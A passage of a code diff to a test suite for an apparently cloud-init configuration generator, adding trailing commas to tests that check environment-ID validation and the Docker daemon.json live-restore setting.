-      validateCloudInitVariables(baseVariables({ environmentId: 'env-abc123' }))
+      validateCloudInitVariables(baseVariables({ environmentId: 'env-abc123' })),
     ).not.toThrow();
 
     expect(() =>
-      validateCloudInitVariables(baseVariables({ environmentId: 'ENV_TEST-123_abc' }))
+      validateCloudInitVariables(baseVariables({ environmentId: 'ENV_TEST-123_abc' })),
     ).not.toThrow();
   });
 
   it('accepts empty role and environmentId', () => {
     expect(() =>
-      validateCloudInitVariables(baseVariables({ role: '', environmentId: '' }))
+      validateCloudInitVariables(baseVariables({ role: '', environmentId: '' })),
     ).not.toThrow();
   });
 });
@@ -2404,7 +2012,7 @@ describe('Docker daemon.json live-restore', () => {
     const config = generateCloudInit(baseVariables(), { validateSize: false });
     const parsed = YAML.parse(config);
     const daemonJson = parsed.write_files.find(
-      (f: { path: string }) => f.path === '/etc/docker/daemon.json'
+      (f: { path: string }) => f.path === '/etc/docker/daemon.json',
     );
     expect(daemonJson).toBeDefined();
     const dockerConfig = JSON.parse(daemonJson.content);
